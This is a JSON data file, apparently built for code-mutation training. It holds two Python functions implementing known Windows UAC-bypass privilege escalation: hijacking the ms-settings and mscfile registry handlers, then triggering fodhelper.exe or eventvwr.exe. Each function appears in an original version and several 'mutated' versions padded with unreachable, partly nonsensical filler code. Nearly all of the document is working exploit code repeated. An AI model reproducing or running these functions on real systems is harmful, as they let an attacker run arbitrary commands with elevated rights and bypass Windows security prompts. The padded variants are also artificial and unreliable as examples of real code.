[
    {
        "func_name": "registry_hijacking_fodhelper",
        "original": "def registry_hijacking_fodhelper(cmd, params=''):\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    fodhelperPath = 'Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)\n    except:\n        CreateKey(HKCU, fodhelperPath)\n    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)\n    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, '')\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    triggerPath = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')\n    wow64 = ctypes.c_long(0)\n    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))\n    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)\n    time.sleep(5)\n    DeleteKey(HKCU, fodhelperPath)",
        "mutated": [
            "def registry_hijacking_fodhelper(cmd, params=''):\n    if False:\n        i = 10\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    fodhelperPath = 'Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)\n    except:\n        CreateKey(HKCU, fodhelperPath)\n    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)\n    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, '')\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    triggerPath = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')\n    wow64 = ctypes.c_long(0)\n    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))\n    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)\n    time.sleep(5)\n    DeleteKey(HKCU, fodhelperPath)",
            "def registry_hijacking_fodhelper(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    fodhelperPath = 'Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)\n    except:\n        CreateKey(HKCU, fodhelperPath)\n    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)\n    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, '')\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    triggerPath = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')\n    wow64 = ctypes.c_long(0)\n    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))\n    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)\n    time.sleep(5)\n    DeleteKey(HKCU, fodhelperPath)",
            "def registry_hijacking_fodhelper(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    fodhelperPath = 'Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)\n    except:\n        CreateKey(HKCU, fodhelperPath)\n    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)\n    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, '')\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    triggerPath = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')\n    wow64 = ctypes.c_long(0)\n    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))\n    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)\n    time.sleep(5)\n    DeleteKey(HKCU, fodhelperPath)",
            "def registry_hijacking_fodhelper(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    fodhelperPath = 'Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)\n    except:\n        CreateKey(HKCU, fodhelperPath)\n    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)\n    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, '')\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    triggerPath = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')\n    wow64 = ctypes.c_long(0)\n    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))\n    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)\n    time.sleep(5)\n    DeleteKey(HKCU, fodhelperPath)",
            "def registry_hijacking_fodhelper(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    fodhelperPath = 'Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)\n    except:\n        CreateKey(HKCU, fodhelperPath)\n    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)\n    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, '')\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    triggerPath = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')\n    wow64 = ctypes.c_long(0)\n    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))\n    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)\n    time.sleep(5)\n    DeleteKey(HKCU, fodhelperPath)"
        ]
    },
    {
        "func_name": "registry_hijacking_eventvwr",
        "original": "def registry_hijacking_eventvwr(cmd, params=''):\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    mscCmdPath = 'Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)\n    except:\n        registry_key = CreateKey(HKCU, mscCmdPath)\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    eventvwrPath = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')\n    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    time.sleep(5)\n    DeleteKey(HKCU, mscCmdPath)",
        "mutated": [
            "def registry_hijacking_eventvwr(cmd, params=''):\n    if False:\n        i = 10\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    mscCmdPath = 'Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)\n    except:\n        registry_key = CreateKey(HKCU, mscCmdPath)\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    eventvwrPath = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')\n    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    time.sleep(5)\n    DeleteKey(HKCU, mscCmdPath)",
            "def registry_hijacking_eventvwr(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    mscCmdPath = 'Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)\n    except:\n        registry_key = CreateKey(HKCU, mscCmdPath)\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    eventvwrPath = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')\n    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    time.sleep(5)\n    DeleteKey(HKCU, mscCmdPath)",
            "def registry_hijacking_eventvwr(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    mscCmdPath = 'Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)\n    except:\n        registry_key = CreateKey(HKCU, mscCmdPath)\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    eventvwrPath = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')\n    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    time.sleep(5)\n    DeleteKey(HKCU, mscCmdPath)",
            "def registry_hijacking_eventvwr(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    mscCmdPath = 'Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)\n    except:\n        registry_key = CreateKey(HKCU, mscCmdPath)\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    eventvwrPath = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')\n    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    time.sleep(5)\n    DeleteKey(HKCU, mscCmdPath)",
            "def registry_hijacking_eventvwr(cmd, params=''):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)\n    mscCmdPath = 'Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command'\n    if params:\n        cmd = '%s %s'.strip() % (cmd, params)\n    try:\n        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)\n    except:\n        registry_key = CreateKey(HKCU, mscCmdPath)\n    SetValueEx(registry_key, '', 0, REG_SZ, cmd)\n    CloseKey(registry_key)\n    eventvwrPath = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')\n    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)\n    time.sleep(5)\n    DeleteKey(HKCU, mscCmdPath)"
        ]
    }
]